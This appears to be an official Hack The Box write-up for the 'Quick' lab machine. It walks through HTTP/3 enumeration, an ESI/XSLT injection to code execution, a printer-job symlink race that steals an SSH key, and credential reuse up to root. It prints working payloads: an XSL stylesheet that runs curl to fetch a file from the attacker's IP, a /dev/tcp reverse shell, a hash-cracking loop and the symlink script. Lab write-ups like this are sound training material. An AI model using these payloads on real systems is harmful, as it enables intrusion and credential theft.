@@ -1,0 +1,325 @@
+Quick
+
+24th August 2020 / Document No D20.100.84
+Prepared By: MinatoTW
+Machine Author(s): MrR3boot
+Difficulty: Hard
+Classification: Official
+Synopsis
+
+Quick is a hard difficulty Linux machine that features a website running on the HTTP/3 protocol.
+Enumeration of the website reveals default credentials. The client portal is found to be vulnerable
+to ESI (Edge Side Includes) injection. This is used to obtain code execution and gain a foothold. A
+weak password gives access to a printer console, which permits the addition of new printers.
+Weak file permissions are exploited to move laterally. Plaintext credentials exposed in a
+configuration are reused to escalate to root.
+
+Skills Required
+
+      Web Enumeration
+      Bash Scripting
+
+Skills Learned
+
+      HTTP/3 Protocol
+      Using Symlinks
+      ESI Injection
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.186 | grep ^[0-9] | cut -d '/' -f
+   1 | tr '\n' ',' | sed s/,$//)
+   nmap -sC -sV -p$ports 10.10.10.186
+
+Nmap reveals port 9001 running Apache as well as SSH running on its default port.
+
+Apache
+
+The website on port 9001 displays information about the broadband service.
+
+The page contains a hyperlink pointing to portal.quick.htb , stating that it supports the latest
+TLS and HTTP implementations. The latest TLS and HTTP versions are TLSv1.3 and HTTP/3
+respectively. Let's add the following entries to the hosts file for further enumeration.
+
+   10.10.10.186 portal.quick.htb quick.htb
+The page also contains some testimonials from clients at the bottom.
+This could let us create a potential username list. Furthermore, clicking on the clients hyperlink
+leads us to a list of clients.
+
+Clicking on Get Started takes us to the login page.
+
+HTTP/3
+
+HTTP 3.0 uses the QUIC protocol for communication. This protocol operates over UDP port 443
+by default. Let's check if this port is open.
+   nc -v -u portal.quick.htb 443
+
+Trying to connect to this port via Netcat succeeds, which is an indication that HTTP/3 is in use.
+Let's check if the portal is accessible over the HTTP/3 protocol. Stable versions of Firefox and
+Chrome don't support HTTP/3 out of box. Instead, we can use the quiche client.
+
+   git clone --recursive https://github.com/cloudflare/quiche.git
+   cd quiche
+   apt install cargo
+   cargo build --examples
+   cd target/debug/examples
+Once the build completes, the http3-client binary can be used to make requests.
+   ./http3-client https://portal.quick.htb
+
+The connection was successful and HTML data is returned.
+   ./http3-client 'https://portal.quick.htb?view=docs'
+Requesting the docs page returns two interesting files. Let's try to download them.
+   ./http3-client 'https://portal.quick.htb/docs/Connectivity.pdf' >
+   Connectivity.pdf
+   ./http3-client 'https://portal.quick.htb/docs/QuickStart.pdf' > QuickStart.pdf
+
+The connectivity document is found to contain some interesting information.
+
+According to the document, the client's email and password Quick4cc3$$ can be used to login to
+the portal. A list of email addresses can be built using the usernames from testimonials and the
+client companies.
+It's possible that these companies would have have email addresses associated with the country
+TLDs (Top Level Domains). For example, .co.uk for United Kingdom or .co.us for United
+States. A list of TLDs can be found here. A list of emails can be created based on this:
+
+   tim@qconsulting.co.uk
+   roy@darkwing.co.us
+   elisa@wink.co.uk
+   james@lazycoop.cn
+Attempting to login with these emails and the password Quick4cc3$$ gives us access to the user
+Elisa .
+
+Clicking on Raise Ticket directs us to a page where we can submit an issue.
+The returned ticket ID can now be searched from the home page.
+Let's intercept this request in Burp and hit Ctrl + R to send this to repeater.
+The response is found to contain the interesting header X-Powered-By: Esigate . Searching
+about esigate brings us to this page. Esigate is used for web application integration and
+processing of data on the server side before being passed to the client. This allows developers to
+use multiple frameworks internally and combine their views to produce a unified application.
+Foothold
+
+ESI or Edge Side Includes, is a markup language used to dynamically include content from other
+sources. However, if incorrectly implemented, this can be dangerous and lead to code execution.
+This blogpost describes how ESIGate can be exploited via XSLT (eXtensible Stylesheet Language
+Transformations) injection.
+XSLT is used to transform XML documents to other XML formats. For example, XML input can be
+transformed to XHTML. ESI provides the ability to load custom XSLT while processing data.
+Let's verify if the server is vulnerable with the following payload:
+
+   <esi:include src="http://example.com/" stylesheet="http://10.10.14.4/esi.xsl">
+   </esi:include>
+The payload above loads the stylesheet from our server http://10.10.14.4/esi.xsl and
+applies it to the data from example.com . Raise another ticket with the above payload.
+
+Next, start an HTTP server on port 80 and submit the ticket. Let's turn on Burp intercept and
+search for the ticket ID. Sending this to the repeater (Ctrl + R) and forwarding it returns a 404
+error.
+
+Checking back on the HTTP server shows a request from the server.
+This confirms that the server is allowed to load external stylesheets. Let's attempt to execute
+code with the payload below.
+
+   <?xml version="1.0" ?>
+   <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+   <xsl:output method="xml" omit-xml-declaration="yes"/>
+   <xsl:template match="/"
+
+     xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+     xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
+   <root>
+   <xsl:variable name="cmd"><![CDATA[curl http://10.10.14.4/shell -o /tmp/shell]]>
+   </xsl:variable>
+   <xsl:variable name="rtObj" select="rt:getRuntime()"/>
+   <xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
+   Process: <xsl:value-of select="$process"/>
+   Command: <xsl:value-of select="$cmd"/>
+   </root>
+   </xsl:template>
+   </xsl:stylesheet>
+
+Copy the contents above into a file named esi.xsl and create another file named shell with
+the following contents:
+
+   #!/bin/bash
+   bash -i >& /dev/tcp/10.10.14.4/4444 0>&1
+
+The command above sends a bash reverse shell to port 4444. We can resend the search request
+through repeater, which should trigger the payload once again. This time the server retrieves the
+esi.xml file from our box and process it, resulting in execution of the curl command.
+
+Next, edit the XSL file with the following command:
+   <xsl:variable name="cmd"><![CDATA[bash /tmp/shell]]>
+
+This should execute the reverse shell present in /tmp/shell . Resending the search request
+should return a shell as the user sam on port 4444.
+Lateral Movement
+
+Inspecting the web root reveals two non-default folders named printer and jobs .
+
+The jobs folder is found to be empty, but the printer folder isn't. The apache configuration is
+referenced to discover another vhost running as the srvadm user.
+
+   cat /etc/apache2/sites-enabled/000-default.conf
+
+Add printerv2.quick.htb to the hosts file. Browsing to this subdomain reveals a login form.
+The previously gained credentials and default credentials such as admin / admin and admin /
+password don't work. We can look at the source in /var/www/printer/index.php for more
+information.
+
+   cat index.php
+   <?php
+   include("db.php");
+   if(isset($_POST["email"]) && isset($_POST["password"]))
+   {
+
+                 $email=$_POST["email"];
+                 $password = $_POST["password"];
+                 $password = md5(crypt($password,'fa'));
+                 $stmt=$conn->prepare("select email,password from users where email=? and
+   password=?");
+                 $stmt->bind_param("ss",$email,$password);
+                 $stmt->execute();
+                 $result = $stmt->get_result();
+                 $num_rows = $result->num_rows;
+                 if($num_rows > 0 && $email === "srvadm@quick.htb")
+                 {
+
+                                session_start();
+                                $_SESSION["loggedin"]=$email;
+                                header("location: home.php");
+   <SNIP>
+
+The page only allows srvadm@quick.htb to login. Input passwords are hashed using the crypt
+function with the salt fa . The output hash is then hashed again with the MD5 algorithm. This
+hashed password is compared to the one from the users table.
+
+Database credentials are found in the file db.php .
+
+   <?php
+   $conn = new mysqli("localhost","db_adm","db_p4ss","quick");
+   ?>
+Let's login to SQL and look at the users table.
+   mysql -u db_adm -pdb_p4ss quick -e 'select * from users'
+
+We can put together PHP and bash scripts quickly to try and crack this password. The PHP script
+below takes in a word as an argument and hashes it. This hash is checked against the one
+obtained from database. An exit code of 0 is returned if the hash matches, else it returns 1.
+
+   <?php
+   $word = $argv[1];
+   $hash = md5(crypt($word,'fa'));
+   if($hash === 'e626d51f8fbfd1124fdea88396c35d05')
+
+       exit(0);
+   else
+
+       exit(1);
+   ?>
+The bash script below passes each word from rockyou.txt to the PHP script and checks if the
+exit code is 0, in which case it outputs the password and exits.
+   #!/bin/bash
+   while read -r line; do
+
+        word="$line"
+        php -f check.php $word
+        if [[ $? -eq 0 ]]; then
+
+            echo "Password found: $word"
+            break
+        fi
+   done < /usr/share/wordlists/rockyou.txt
+Running the script reveals that the password is yl51pbx .
+
+We can use the credentials srvadm@quick.htb / yl51pbx to login.
+The page contains additional functionality to add and list printers. Let's try adding a printer that
+points to our IP address, and see if we receive any data.
+
+Stand up a listener on port 9100 and click on Add Printer . A printer is added successfully, but
+we don't observe any callbacks.
+
+Navigating to the printers page lists our added printer. Clicking on the printer icon on the right
+triggers a connection.
+The page also allows us to add a job from the jobs page.
+
+Restarting the listener and clicking on Print sends the data entered by us.
+
+Let's take a look at the source code of job.php for a better understanding of what is happening.
+   <?php
+   <SNIP>
+   $title=$_POST["title"];
+   $file = date("Y-m-d_H:i:s");
+   file_put_contents("/var/www/jobs/".$file,$_POST["desc"]);
+   chmod("/var/www/printer/jobs/".$file,"0777");
+   $stmt=$conn->prepare("select ip,port from jobs");
+   $stmt->execute();
+   $result=$stmt->get_result();
+   if($result->num_rows > 0)
+   {
+                 $row=$result->fetch_assoc();
+                 $ip=$row["ip"];
+        $port=$row["port"];
+        try
+        {
+
+                  $connector = new NetworkPrintConnector($ip,$port);
+                  sleep(0.5); //Buffer for socket check
+                  $printer = new Printer($connector);
+                  $printer -> text(file_get_contents("/var/www/jobs/".$file));
+                  $printer -> cut();
+                  $printer -> close();
+                  $message="Job assigned";
+                  unlink("/var/www/jobs/".$file);
+
+<SNIP>
+
+The code creates a file named with the current time and copies the input data to it. It then
+retrieves printer information and initiates a connection to it. If the connection is successful, the
+data is sent to the printer and then the job file is deleted.
+
+We see that the file is created with 777 (i.e. world writable) permissions. As the server is running
+as srvadm , this will let us hijack the file before it's read by the application and replace it with a
+symlink to their SSH key.
+
+A small bash script can be written to achieve this.
+
+#!/bin/bash
+while true
+do
+
+   job=`ls /var/www/jobs`
+   if [[ $job ]]
+   then
+
+       echo $job
+       ln -sf /home/srvadm/.ssh/id_rsa /var/www/jobs/$job
+   fi
+   sleep 0.1
+done
+
+The script runs in a loop and links any file found to the user's SSH key. Transfer the script using
+wget and make sure the jobs folder is empty before running it.
+
+wget 10.10.14.4/replace.sh
+chmod +x replace.sh
+./replace.sh
+
+Return to the jobs page and create another job. After sending the job to the printer, a private SSH
+key should be received.
+The key can now be used to login to the box as srvadm .
+Privilege Escalation
+
+The home folder of this is found to contain a .cache directory.
+
+It's possible for configurations and logs to contain plaintext credentials. Let's grep for such strings
+with credentials.
+
+   grep -ERni 'root|srvadm|password' .
+The grep command above uses a regular expression ( -E ), to search the files in the current folder
+recursively ( -R ). The search returns all strings matching root , srvadm or password irrespective
+of their case ( -i ).
+
+One of the configuration files is found to contain a password within a connection string, which is
+URL encoded. The password &ftQ4K3SGde8? is found to be valid for root and can be used to
+switch to it.
+
